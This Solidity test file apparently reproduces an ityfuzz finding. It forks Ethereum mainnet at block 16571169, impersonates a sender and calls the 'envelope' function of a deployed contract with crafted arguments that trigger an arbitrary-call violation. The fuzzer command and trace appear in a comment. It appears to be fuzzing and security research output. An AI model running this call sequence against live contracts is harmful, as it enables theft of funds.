// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x6B175474E89094C44Da98b954EedeAC495271d0F,0x9008D19f58AAbD9eD0D60971565AA8510560ab41,0xcD07a7695E3372aCD2B2077557DE93e667B92bd8 -c eth --onchain-block-number 16571169 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Arbitrary call from "0xcd07a7695e3372acd2b2077557de93e667b92bd8" to 0x0000000000000000000000000000000000000000
================ Trace ================
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   ├─[1] 0xcD07a7695E3372aCD2B2077557DE93e667B92bd8.envelope(((0x0000000000000000000000000000000000000000, 0, 0xddffffffff808ea35a42105da3ff7f00003ba3ff)), 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, (), (90363238266604669164153661710592770268838932384442667297691.7041 Ether), (0), 0)
   │  │  └─ ← ()


 */

contract C6B17 is Test {
    function setUp() public {
        vm.createSelectFork("eth", 16571169);
    }

    function test() public {

        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        
        0xcD07a7695E3372aCD2B2077557DE93e667B92bd8.call(abi.encodeWithSignature(
            "envelope((address,uint256,bytes)[],address,address[],uint256[],int256[],uint256)",[[0x0000000000000000000000000000000000000000, 0, 0xddffffffff808ea35a42105da3ff7f00003ba3ff]], 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, [], [90363238266604669164153661710592770268838932384442667297691.7041 Ether], [0], 0
        )); 
    }

    // Stepping with return
    receive() external payable {}
}

